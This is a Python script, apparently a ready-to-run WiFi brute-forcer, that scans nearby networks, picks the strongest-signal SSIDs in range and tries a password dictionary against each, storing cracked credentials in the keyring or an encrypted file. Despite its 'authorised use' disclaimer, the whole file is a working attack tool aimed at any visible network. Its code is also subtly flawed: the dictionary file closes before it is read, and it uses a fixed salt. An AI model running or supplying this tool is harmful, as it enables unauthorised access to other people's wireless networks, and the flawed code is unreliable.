#!/usr/bin/env python3
"""
WiFi Password Brute‑Forcer (Educational & Authorised Use Only)

This module scans for nearby WiFi networks and attempts to connect to them
using a dictionary of candidate passwords. It is designed for testing the
security of your own networks or recovering a forgotten password on a
trusted network.

Security features:
    - Discovered passwords are NEVER printed to the console.
    - By default, credentials are stored in the operating system's keyring
      (Windows Credential Manager, macOS Keychain, or Linux Secret Service).
    - If the keyring is unavailable, an AES‑encrypted file (Fernet) is used
      as a fallback, requiring a user‑supplied passphrase.
    - No plaintext password is ever written to disk.

Dependencies:
    - pywifi (for WiFi control)
    - keyring (optional, for secure OS‑level storage)
    - cryptography (optional, for encrypted file storage)

Usage:
    python wifi_cracker.py --dict passwords.txt [--max 5] [--exclude HomeNet] [--store keyring|encrypted]
"""

import time
import argparse
import sys
import getpass
import base64
import os
from typing import List, Optional, Set, Tuple, Dict, Any

import pywifi
from pywifi import const

# ------------------------------------------------------------------------------
# Optional secure storage libraries
# ------------------------------------------------------------------------------

try:
    import keyring
    HAS_KEYRING = True
except ImportError:
    HAS_KEYRING = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False


# ------------------------------------------------------------------------------
# Command‑line argument parsing
# ------------------------------------------------------------------------------

def parse_arguments() -> argparse.Namespace:
    """
    Parse and validate command‑line arguments.

    Returns:
        argparse.Namespace: An object containing all parsed arguments.

    The following arguments are supported:
        --dict      : Path to the password dictionary file (one password per line).
        --max       : Maximum number of visible WiFi networks to try (default: 5).
        --exclude   : List of SSIDs to skip (e.g., --exclude MyHomeNet OfficeNet).
        --store     : Storage method: 'keyring' (default) or 'encrypted' (AES file).
        --output    : Path to the encrypted output file (used only with --store encrypted).
    """
    parser = argparse.ArgumentParser(
        description="Brute‑force WiFi passwords using a dictionary."
    )
    parser.add_argument(
        "--dict",
        required=True,
        help="Path to the password dictionary file (one password per line)."
    )
    parser.add_argument(
        "--max",
        type=int,
        default=5,
        help="Maximum number of visible WiFi networks to attempt (default: 5)."
    )
    parser.add_argument(
        "--exclude",
        nargs="*",
        default=[],
        help="List of SSIDs to exclude from cracking (e.g., --exclude HomeNet Office)."
    )
    parser.add_argument(
        "--store",
        choices=["keyring", "encrypted"],
        default="keyring",
        help="Storage method for discovered passwords: 'keyring' (system keychain) or "
             "'encrypted' (AES‑encrypted file). Default is 'keyring'."
    )
    parser.add_argument(
        "--output",
        default="found.enc",
        help="Path to the encrypted output file (only used when --store is 'encrypted')."
    )
    return parser.parse_args()


# ------------------------------------------------------------------------------
# WiFi interface management
# ------------------------------------------------------------------------------

def get_wifi_interfaces() -> Optional[pywifi.Interface]:
    """
    Retrieve the first available WiFi interface.

    Returns:
        pywifi.Interface: The first interface object, or None if no interface is found.
    """
    wifi = pywifi.PyWiFi()
    interfaces = wifi.interfaces()
    if not interfaces:
        print("❌ No WiFi interface found.")
        return None
    return interfaces[0]


def disconnect_iface(iface: pywifi.Interface) -> None:
    """
    Disconnect the given interface from any active WiFi connection.

    Args:
        iface: A pywifi Interface object.
    """
    iface.disconnect()
    time.sleep(1)  # Allow the disconnection to complete


def scan_networks(iface: pywifi.Interface, max_networks: int,
                  exclude: Set[str]) -> List[str]:
    """
    Scan for visible WiFi networks and return a filtered list of SSIDs.

    The scan results are sorted by signal strength (strongest first) and only
    the top `max_networks` SSIDs are returned. Duplicate SSIDs are collapsed,
    keeping only the strongest signal. Excluded SSIDs are skipped.

    Args:
        iface: WiFi interface to use for scanning.
        max_networks: Maximum number of SSIDs to return.
        exclude: Set of SSIDs that should be ignored.

    Returns:
        List[str]: Up to `max_networks` SSIDs, sorted by signal strength.
    """
    print("🔍 Scanning for WiFi networks...")
    iface.scan()
    time.sleep(8)  # Allow the scan to complete (typical time for pywifi)

    scan_results = iface.scan_results()
    ssid_signal = {}

    # Collect unique SSIDs and keep the strongest signal for each
    for net in scan_results:
        ssid = net.ssid
        if ssid and ssid not in exclude:
            if ssid not in ssid_signal or net.signal > ssid_signal[ssid]:
                ssid_signal[ssid] = net.signal

    # Sort by signal strength descending
    sorted_networks = sorted(ssid_signal.items(), key=lambda x: x[1], reverse=True)

    # Return only the top `max_networks` SSIDs
    return [ssid for ssid, _ in sorted_networks[:max_networks]]


def test_password(iface: pywifi.Interface, ssid: str, password: str) -> bool:
    """
    Attempt to connect to a specific WiFi network using the given password.

    This function builds a connection profile, removes any existing profiles,
    and tries to connect. It then waits 5 seconds and checks the connection
    status to determine success.

    Args:
        iface: WiFi interface.
        ssid: Target network SSID.
        password: Password to test.

    Returns:
        bool: True if the connection was successfully established, False otherwise.
    """
    # Build a connection profile
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # Most common encryption type
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    # Remove any previous profiles to avoid conflicts
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    # Attempt connection
    iface.connect(tmp_profile)
    time.sleep(5)  # Allow connection attempt to complete

    # Return True if connected
    return iface.status() == const.IFACE_CONNECTED


# ------------------------------------------------------------------------------
# Secure storage helpers
# ------------------------------------------------------------------------------

def store_in_keyring(ssid: str, password: str) -> bool:
    """
    Store the discovered password in the system keyring.

    The keyring is accessed via the `keyring` library. The service name is fixed
    to "wifi_cracker" and the account name is the SSID.

    Args:
        ssid: WiFi network name (used as the account identifier).
        password: Cleartext password to store.

    Returns:
        bool: True if storage succeeded, False otherwise (e.g., library missing or error).
    """
    if not HAS_KEYRING:
        return False
    try:
        keyring.set_password("wifi_cracker", ssid, password)
        return True
    except Exception:
        return False


def get_encryption_cipher() -> Optional[Fernet]:
    """
    Prompt the user for an encryption passphrase and return a Fernet cipher.

    The passphrase is derived using PBKDF2‑HMAC with a fixed salt and 100,000
    iterations. If the user cancels or enters an empty passphrase, None is returned.

    Returns:
        Fernet: A ready‑to‑use Fernet cipher object, or None if cryptography is
        not installed or the user did not provide a passphrase.
    """
    if not HAS_CRYPTO:
        print("❌ The 'cryptography' library is not installed. Cannot use encrypted storage.")
        return None

    try:
        pwd = getpass.getpass("Enter an encryption passphrase (keep it safe; loss = data loss): ")
        if not pwd:
            print("No passphrase entered. Encryption aborted.")
            return None

        # Fixed salt (in production, generate a random salt and save it alongside the encrypted file)
        salt = b'wifi_salt_2026'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(pwd.encode()))
        return Fernet(key)
    except Exception as e:
        print(f"❌ Failed to create encryption cipher: {e}")
        return None


def store_encrypted(ssid: str, password: str, cipher: Fernet, output_file: str) -> bool:
    """
    Encrypt the credential and append it to the output file.

    The encrypted payload is one line per credential, each line being the Fernet
    encrypted token of the string "<ssid>:<password>".

    Args:
        ssid: WiFi SSID.
        password: Plaintext password.
        cipher: Fernet cipher object.
        output_file: Path to the encrypted file (will be created/append).

    Returns:
        bool: True if writing succeeded, False otherwise.
    """
    try:
        encrypted = cipher.encrypt(f"{ssid}:{password}".encode())
        with open(output_file, "ab") as f:   # 'ab' = append binary
            f.write(encrypted + b"\n")
        return True
    except Exception as e:
        print(f"⚠️  Failed to write encrypted credential: {e}")
        return False


# ------------------------------------------------------------------------------
# Main brute‑force routine
# ------------------------------------------------------------------------------

def brute_force(iface: pywifi.Interface, ssid_list: List[str],
                dict_path: str, store_method: str, output_file: str) -> None:
    """
    Orchestrate the brute‑force process: iterate over passwords, test each SSID,
    and store found credentials securely.

    The function reads the dictionary line by line, tries each password on all
    remaining SSIDs, and upon success stores the credential using the selected
    method (keyring or encrypted file). If the primary method fails, it attempts
    a fallback (e.g., encrypted file if keyring failed). As a last resort, the
    credential is kept only in memory (lost when the program exits).

    Args:
        iface: WiFi interface.
        ssid_list: List of SSIDs to attempt (ordered by priority, usually signal).
        dict_path: Path to the password dictionary file.
        store_method: 'keyring' or 'encrypted'.
        output_file: File path for encrypted storage (if used).
    """
    if not ssid_list:
        print("⚠️  No networks to test. Exiting.")
        return

    # Validate and prepare storage backend
    if store_method == "keyring" and not HAS_KEYRING:
        print("⚠️  'keyring' library not available. Falling back to encrypted file storage.")
        store_method = "encrypted"

    cipher = None
    if store_method == "encrypted":
        cipher = get_encryption_cipher()
        if cipher is None:
            print("❌ Failed to initialise encrypted storage. Aborting.")
            sys.exit(1)

    # Read the password dictionary
    try:
        with open(dict_path, "r", encoding="utf-8") as f:
            passwords = (line.strip() for line in f if line.strip())
    except FileNotFoundError:
        print(f"❌ Dictionary file '{dict_path}' not found.")
        sys.exit(1)
    except Exception as e:
        print(f"❌ Error reading dictionary: {e}")
        sys.exit(1)

    found = {}                     # Temporary in‑memory store for fallback
    remaining = set(ssid_list)     # SSIDs still not cracked
    attempt = 0

    # Main loop: iterate over each password
    for pwd in passwords:
        if not remaining:
            break
        attempt += 1
        print(f"🔄 Attempt {attempt}...", end=" ", flush=True)

        # Try the current password on every remaining SSID
        for ssid in list(remaining):
            if test_password(iface, ssid, pwd):
                # Password found for this SSID
                remaining.remove(ssid)
                print(f"✅ Found password for '{ssid}'")

                # --- Secure storage ---
                success = False
                if store_method == "keyring":
                    success = store_in_keyring(ssid, pwd)
                    if success:
                        print(f"   🔐 Stored in system keyring (service: wifi_cracker, account: {ssid})")
                    else:
                        print(f"   ⚠️  Keyring store failed. Falling back to encrypted file.")
                        # Try encrypted file as a fallback
                        if cipher is None:
                            cipher = get_encryption_cipher()
                        if cipher:
                            success = store_encrypted(ssid, pwd, cipher, output_file)
                            if success:
                                print(f"   🔐 Stored encrypted in {output_file}")

                else:  # 'encrypted'
                    if cipher:
                        success = store_encrypted(ssid, pwd, cipher, output_file)
                        if success:
                            print(f"   🔐 Stored encrypted in {output_file}")

                # If all storage methods failed, keep it only in memory
                if not success:
                    found[ssid] = pwd
                    print(f"   ⚠️  No persistent storage available. Credential kept in memory only (lost on exit).")
            else:
                # Connection failed, disconnect to clean up before next attempt
                disconnect_iface(iface)

        # Small delay between password attempts to avoid flooding the interface
        time.sleep(0.5)

    # Final summary
    cracked_count = len(set(ssid_list) - remaining)
    if cracked_count > 0:
        print(f"\n🎉 Successfully cracked {cracked_count} network(s).")
    else:
        print("\n❌ No passwords matched any network.")


# ------------------------------------------------------------------------------
# Entry point
# ------------------------------------------------------------------------------

def main() -> None:
    """
    Program entry point: parse arguments, initialise WiFi, scan networks,
    and start the brute‑force process.
    """
    args = parse_arguments()

    # Get the first WiFi interface
    iface = get_wifi_interfaces()
    if iface is None:
        sys.exit(1)

    # Ensure we are disconnected before scanning
    disconnect_iface(iface)

    # Scan for visible networks (excluding those specified)
    exclude_set = set(args.exclude)
    ssid_list = scan_networks(iface, args.max, exclude_set)

    if not ssid_list:
        print("ℹ️  No visible WiFi networks found (or all were excluded).")
        sys.exit(0)

    print(f"📡 Found {len(ssid_list)} network(s): {', '.join(ssid_list)}")

    # Launch the brute‑force routine
    brute_force(iface, ssid_list, args.dict, args.store, args.output)


if __name__ == "__main__":
    main()